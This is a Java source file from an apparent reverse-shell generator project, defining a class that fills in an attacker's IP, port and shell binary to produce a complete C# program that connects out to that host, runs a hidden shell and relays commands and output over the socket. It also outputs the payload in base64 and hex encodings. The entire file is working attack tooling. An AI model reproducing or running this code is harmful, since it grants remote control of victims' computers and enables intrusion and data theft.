package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class CTCP_Client extends Reverse {

    protected String shellFormat = "";

    public CTCP_Client(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n\tpublic class Program\n\t{\n\t\tstatic StreamWriter streamWriter;\n\n\t\tpublic static void Main(string[] args)\n\t\t{\n\t\t\tusing(TcpClient client = new TcpClient(\"%s\", %s))\n\t\t\t{\n\t\t\t\tusing(Stream stream = client.GetStream())\n\t\t\t\t{\n\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n\t\t\t\t\t{\n\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n\t\t\t\t\t\t\n\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\t\t\tProcess p = new Process();\n\t\t\t\t\t\tp.StartInfo.FileName = \"%s\";\n\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\t\t\tp.Start();\n\t\t\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\t\t\twhile(true)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\t\t\t//strInput.Append(\"\\n\");\n\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n\t}\n}", this.getLocalIP(), this.getLocalPort(), this.getShell());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
    
} 
    